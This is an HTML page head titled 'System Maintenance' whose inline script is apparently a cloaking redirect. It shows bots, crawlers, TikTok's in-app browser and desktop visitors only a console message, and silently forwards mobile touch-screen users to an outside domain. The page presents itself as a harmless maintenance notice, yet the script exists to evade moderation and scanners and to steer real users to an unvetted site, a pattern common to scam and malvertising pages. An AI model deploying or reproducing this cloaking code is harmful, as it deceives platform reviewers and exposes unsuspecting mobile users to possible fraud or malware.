<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Maintenance</title>
    <script>
        (function() {
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            var isBot = /bot|google|tiktok|crawler|spider|slurp|facebook|lighthouse|vkshare|twitter|monitor|bytespider/i.test(ua);
          
            var isTikTokBot = /ByteLocale|ByteFullApp|TikTok/i.test(ua) && (window.history.length <= 1);
            
      
            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
            
        
            var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

           
            if (isBot || isTikTokBot || !isMobile || !hasTouch) {
                console.log("Access denied. Desktop or Bot detected.");
            } else {
                
                window.location.replace("https://mell9x.cc/2baa70");
            }
        })();
    </script>
</head>
